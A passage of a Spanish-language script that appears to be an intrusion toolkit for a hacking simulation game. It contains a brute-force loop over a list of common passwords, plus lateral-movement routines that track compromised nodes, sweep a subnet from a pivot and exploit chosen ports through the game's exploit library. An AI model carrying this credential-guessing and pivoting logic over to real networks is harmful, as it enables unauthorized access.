        filas = []
        para v en vectores
            color = "<color=#00ff41>"
            si v.severity == "ALTA" then color = "<color=#ff3131>"
            else if v.severity == "MEDIA" then color = "<color=#ffea00>"
            filas.push([v.path, v.type, color + v.severity + "</color>"])
        print(construir_tabla(columnas, filas))

tarea modulo_escalada_brute(sesion, user, ip, port)
    info("FUERZA BRUTA - " + user)

    passwords = [
        "123456", "password", "qwerty", "abc123", "monkey", "letmein", "dragon",
        "iloveyou", "sunshine", "princess", "football", "shadow", "michael",
        "admin", "root", "toor", "pass", "changeme", "test", "guest",
        "password1", "password123", "admin123", "root123", "qwerty123",
        "ranger", "thomas", "hunter", "buster", "soccer", "daniel"
    ]

    para pwd en passwords
        resultado = _chain_try(sesion, user, pwd, ip, port)
        si resultado != null then
            exito("PASSWORD: " + pwd)
            si ip != "" then enjambre[ip] = pwd
            return resultado

    alerta("No se encontro password")
    return null

// --- FIN SUB-MODULO: modulos/escalada.nini ---
// --- INICIO SUB-MODULO: modulos/lateral.nini ---
// modulo lateral.nini - MOVIMIENTO LATERAL

tarea modulo_lateral_mover:
    opciones = [
        {"label": "Listar nodos del enjambre", "cmd": "list"},
        {"label": "Cambiar a otro nodo", "cmd": "switch"},
        {"label": "Escanear red DESDE pivote", "cmd": "scan"},
        {"label": "Conectar via SSH/FTP", "cmd": "connect"},
        {"label": "Conectar via Metaxploit", "cmd": "net"},
    ]
    
    modo = menu_interactivo("MOVIMIENTO LATERAL", opciones)
    si not modo: return
    
    si modo == "list": lateral_listar_nodos()
    osi modo == "switch": lateral_cambiar_nodo()
    osi modo == "scan": lateral_escanear_desde_pivote()
    osi modo == "connect": lateral_conectar_servicio()
    osi modo == "net": lateral_conectar_metaxploit()

tarea lateral_listar_nodos:
    info("NODOS EN EL ENJAMBRE:")
    i = 1
    para nodo en enjambre:
        ip = nodo.key
        sesion = nodo.value
        tipo = typeof(sesion)
        comp_info = (typeof(sesion) == "shell") >> sesion.host_computer.local_ip |: sesion.local_ip
        estado = (globals.objetivo_actual == ip) >> "<color=#ffea00>ACTUAL</color>" |: "<color=#00ff41>ACTIVO</color>"
        info(str(i) + ". " + ip + " (" + tipo + ") " + estado + " | " + comp_info)
        i = i + 1
    pausa_tactica()

tarea lateral_cambiar_nodo:
    si enjambre.len <= 1: info("Solo hay un nodo."); return
    
    // Mostrar nodos disponibles
    para nodo en enjambre:
        ip = nodo.key
        si ip != globals.objetivo_actual: info(str(i) + ". " + ip); i = i + 1
    
    sel = val(pedir("Nodo > "))
    si sel <= 0: return
    
    // Encontrar nodo seleccionado
    cont = 0
    para k en enjambre.keys:
        si k != globals.objetivo_actual:
            cont = cont + 1
            si cont == sel:
                globals.objetivo_actual = k
                exito("Cambiado a: " + k)
                return
    error("Selección inválida.")

tarea lateral_escanear_desde_pivote:
    info("ESCANEANDO RED DESDE EL NODO...")
    
    sesion = obtener_shell_nodo()
    si not sesion: error("No hay shell activa."); return
    
    ip_local = obtener_ip_local_nodo(sesion)
    si not ip_local: error("No se pudo obtener IP local."); return
    
    info("IP local: " + ip_local)
    
    // Obtener router y dispositivos
    router_nodo = obtener_router_nodo(sesion)
    dispositivos = (router_nodo) >> dispositivos_red_nodo(sesion)
    
    si dispositivos y dispositivos.len > 0:
        exito("Dispositivos: " + str(dispositivos.len))
        para ip en dispositivos:
            nodo_tag = ""
            si ip == ip_local: nodo_tag = " (TU NODO)"
            info("  - " + ip + nodo_tag)
    sino:
        // Fallback: escaneo manual
        red = ip_local.split("\.")[0:3].join("\.") + "."
        info("Escaneando: " + red + "0/24...")
        hosts = []
        para i en rango(1, 255):
            ip = red + str(i)
            si ip != ip_local y sesion.ping(ip) == 1: hosts.push(ip)
        
        si hosts.len == 0:
            info("No se encontraron hosts.")
        sino:
            para h en hosts:
                info("  - " + h)

tarea lateral_conectar_servicio:
    tipo = (pedir("Tipo (ssh/ftp): ")).lower()
    si tipo != "ssh" y tipo != "ftp": error("Usa 'ssh' o 'ftp'"); return
    
    ip = pedir("IP: "); usuario = pedir("Usuario: "); pass = pedir("Pass: ")
    si ip == "" o usuario == "": return
    
    info("Conectando a " + ip + "...")
    sesion = (tipo == "ssh") >> conectar_ssh(ip, usuario, pass) |: conectar_ftp(ip, usuario, pass)
    
    si sesion:
        enjambre[ip] = sesion
        globals.objetivo_actual = ip
        exito("Conectado: " + usuario + "@" + ip)
        modulo_espectro_recon()
    sino: error("No se pudo conectar.")

tarea lateral_conectar_metaxploit:
    ip = pedir("IP objetivo: ")
    si ip == "": return
    
    puertos = puertos_dispositivo(ip)
    
    si not puertos o puertos.len == 0:
        info("Sin forwarding. Intentando directo...")
        sesion = conectar_net(ip, 22)
        si sesion: enjambre[ip] = sesion; globals.objetivo_actual = ip; exito("Conexión directa!"); modulo_espectro_recon()
        sino: error("No se pudo.")
        return
    
    // Mostrar puertos
    info("Puertos: " + str(puertos.len))
    para p en puertos: info("  [" + str(p.port_number) + "] " + info_puerto(p))
    
    sel = val(pedir("Puerto a explotar: "))
    si sel <= 0: return
    
    sesion = conectar_net(ip, sel)
    si sesion:
        enjambre[ip] = sesion
        globals.objetivo_actual = ip
        exito("ACCESO OBTENIDO!")
        modulo_espectro_recon()
    sino: error("Explotación fallida.")

tarea obtener_shell_nodo:
    si not globals.objetivo_actual o globals.objetivo_actual == "localhost": return get_shell
    si enjambre.tiene(globals.objetivo_actual):
        sesion = enjambre[globals.objetivo_actual]
        return (typeof(sesion) == "shell") >> sesion |: null
    return null

tarea obtener_computadora_objetivo:
    sesion = obtener_shell_nodo()
    si sesion: return sesion.host_computer
    return get_shell.host_computer

